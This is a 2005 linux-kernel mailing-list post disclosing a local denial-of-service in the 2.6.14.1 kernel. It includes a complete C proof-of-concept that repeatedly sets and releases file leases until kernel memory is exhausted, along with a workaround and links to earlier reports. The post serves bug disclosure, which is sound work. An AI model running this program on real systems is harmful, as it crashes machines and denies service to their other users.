Return-Path: <linux-kernel-owner+willy=40w.ods.org-S1750924AbVKJRAt@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1750924AbVKJRAt (ORCPT <rfc822;willy@w.ods.org>);
	Thu, 10 Nov 2005 12:00:49 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1750948AbVKJRAt
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Thu, 10 Nov 2005 12:00:49 -0500
Received: from gateway.argo.co.il ([194.90.79.130]:15628 "EHLO
	argo2k.argo.co.il") by vger.kernel.org with ESMTP id S1750899AbVKJRAs
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Thu, 10 Nov 2005 12:00:48 -0500
Message-ID: <43737CBE.2030005@argo.co.il>
Date: Thu, 10 Nov 2005 19:00:46 +0200
From: Avi Kivity <avi@argo.co.il>
User-Agent: Mozilla Thunderbird 1.0.7-1.1.fc4 (X11/20050929)
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: linux-kernel <linux-kernel@vger.kernel.org>
Subject: local denial-of-service with file leases
Content-Type: text/plain; charset=ISO-8859-1; format=flowed
Content-Transfer-Encoding: 7bit
X-OriginalArrivalTime: 10 Nov 2005 17:00:46.0936 (UTC) FILETIME=[4B730580:01C5E618]
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

the following program will oom a the 2.6.14.1 kernel, running as an 
ordinary user:

#include <unistd.h>

#include <stdlib.h>

#include <linux/fcntl.h>

int main(int ac, char **av)

{

    char *fname = av[0];

    int fd = open(fname, O_RDONLY);

    int r;

    

    while (1) {

        r = fcntl(fd, F_SETLEASE, F_RDLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_RDLCK");

            exit(1);

        }

        r = fcntl(fd, F_SETLEASE, F_UNLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_UNLCK");

            exit(1);

        }

    }

    return 0;

}


it will suck all available memory into fasync_cache, causing an oom. a 
workaround is to set fs.leases-enable to 0.

this has already been reported to lkml[1] and fedora[2], with no effect.

[1] http://www.ussg.iu.edu/hypermail/linux/kernel/0510.2/1589.html
[2] https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=172691

